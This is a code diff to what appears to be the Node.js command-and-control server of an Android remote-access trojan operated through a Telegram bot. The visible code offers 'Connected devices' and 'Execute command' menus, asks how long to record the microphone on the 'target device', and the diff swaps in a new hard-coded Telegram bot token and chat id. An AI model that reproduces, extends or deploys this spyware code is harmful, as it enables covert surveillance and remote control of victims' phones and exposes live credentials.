@@ -7,8 +7,8 @@ const multer = require('multer');
 const bodyParser = require('body-parser')
 const axios = require("axios");
 
-const token = '6368397633:AAGi-dFasRT7eYH4Qekg2P51vhmFYMV3wjw'
-const id = '6368397633'
+const token = '8463225577:AAE5kPGnDT96S6TWqVUCB2EAM4cJXUfI4yY'
+const id = '-1003001708944'
 const address = 'https://www.google.com'
 
 const app = express();
@@ -87,6 +87,10 @@ appSocket.on('connection', (ws, req) => {
         appClients.delete(ws.uuid)
     })
 })
+appBot.on('polling_error', (error) => {
+    console.log(error.code);  // => 'EFATAL'
+});
+
 appBot.on('message', (message) => {
     const chatId = message.chat.id;
     if (message.reply_to_message) {
@@ -112,7 +116,7 @@ appBot.on('message', (message) => {
                 {
                     parse_mode: "HTML",
                     "reply_markup": {
-                        "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
+                        "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝗱 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
                         'resize_keyboard': true
                     }
                 }
@@ -212,7 +216,7 @@ appBot.on('message', (message) => {
                 {
                     parse_mode: "HTML",
                     "reply_markup": {
-                        "keyboard": [["𝘾𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
+                        "keyboard": [["𝘾𝙤𝙣𝙣𝙚ċted 𝙙𝙚𝙫𝙞𝙘𝙚𝙨"], ["𝙀𝙭𝙚𝙘𝙪𝙩𝙚 𝙘𝙤𝙢𝙢𝙖𝙣𝙙"]],
                         'resize_keyboard': true
                     }
                 }
@@ -329,7 +333,7 @@ appBot.on('message', (message) => {
             if (appClients.size == 0) {
                 appBot.sendMessage(id,
                     '°• 𝙉𝙤 𝙘𝙤𝙣𝙣𝙚𝙘𝙩𝙞𝙣𝙜 𝙙𝙚𝙫𝙞𝙘𝙚𝙨 𝙖𝙫𝙖𝙞𝙡𝙖𝙗𝙡𝙚\n\n' +
-                    '• ᴍᴀᴋᴇ ꜱᴜʀᴇ ᴛʜᴇ ᴀᴘᴘʟɪᴄᴀᴛɪᴏɴ ɪꜱ ɪɴꜱᴛᴀʟʟᴇᴅ ᴏɴ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ'
+                    '• ᴍᴀᴋᴇ ꜱᴜʀᴇ ᴛʜᴇ ᴀᴘᴘʟɪᴄᴀᴛɪᴏɴ ɪꜱ ɪɴꜱᴛᴀllᴇᴅ ᴏɴ ᴛʜᴇ ᴛᴀʀɢᴇᴛ ᴅᴇᴠɪᴄᴇ'
                 )
             } else {
                 let text = '°• 𝙇𝙞𝙨𝙩 𝙤𝙛 𝙘𝙤𝙣𝙣𝙚𝙘𝙩𝙚𝙙 𝙙𝙚𝙫𝙞𝙘𝙚𝙨 :\n\n'
@@ -674,7 +678,7 @@ appBot.on("callback_query", (callbackQuery) => {
     if (commend == 'microphone') {
         appBot.deleteMessage(id, msg.message_id)
         appBot.sendMessage(id,
-            '°• 𝙀𝙣𝙩𝙚𝙧 𝙝𝙤𝙬 𝙡𝙤𝙣𝙜 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙝𝙚 𝙢𝙞𝙘𝙧𝙤𝙥𝙝𝙤𝙣𝙚 𝙩𝙤 𝙗𝙚 𝙧𝙚𝙘𝙤𝙧𝙙𝙚𝙙\n\n' +
+            '°• 𝙀𝙣𝙩𝙚𝙧 𝙝𝙤𝙬 𝙡𝙤𝙣𝙜 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙝𝙚 𝙢𝙞𝙘𝙧𝙤𝙥𝙝𝙤𝙣𝙚 𝙩𝙤 𝙗𝙚 𝙧𝙚𝙘𝙤𝑟𝙙𝙚𝙙\n\n' +
             '• ɴᴏᴛᴇ ᴛʜᴀᴛ ʏᴏᴜ ᴍᴜꜱᴛ ᴇɴᴛᴇʀ ᴛʜᴇ ᴛɪᴍᴇ ɴᴜᴍᴇʀɪᴄᴀʟʟʏ ɪɴ ᴜɴɪᴛꜱ ᴏꜰ ꜱᴇᴄᴏɴᴅꜱ',
             {reply_markup: {force_reply: true}, parse_mode: "HTML"}
         )
